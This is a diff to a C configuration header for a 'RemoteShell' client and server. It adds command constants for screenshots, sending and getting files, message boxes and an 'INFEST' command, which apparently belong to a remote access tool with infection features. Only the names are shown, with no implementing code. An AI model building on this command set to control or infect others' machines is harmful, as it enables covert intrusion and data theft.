@@ -1,7 +1,7 @@
 #pragma once
 //////////////////////////////////////////////////////////////////////////////////////
 //						RemoteShell Configuration file								//
-//		 Configure your "RemoteShell Client" & "RemoteShell Server" at here			//
+//		 Setup		 "RemoteShell Client" & "RemoteShell Server" at here			//
 //////////////////////////////////////////////////////////////////////////////////////
 
 /*				Server					*/
@@ -26,7 +26,12 @@
 #define     REMOTESHELL_CCMD_LIST           "list"
 #define     REMOTESHELL_CCMD_CONNECT        "connect"
 #define     REMOTESHELL_CCMD_LOGIN	        "login"
-
+#define     REMOTESHELL_CCMD_EXIT			"exit"	
+#define     REMOTESHELL_CCMD_SCREENSHOT		"SCREENSHOT "
+#define     REMOTESHELL_CCMD_SENDFILE		"SENDFILE "
+#define     REMOTESHELL_CCMD_GETFILE		"GETFILE "
+#define     REMOTESHELL_CCMD_MSGBOX			"MSG "	
+#define     REMOTESHELL_CCMD_INFEST			"INFEST "
 
 #define     GRAMMAR_TOKEN_CMDLIST           1
 #define     GRAMMAR_TOKEN_CONNECT           2
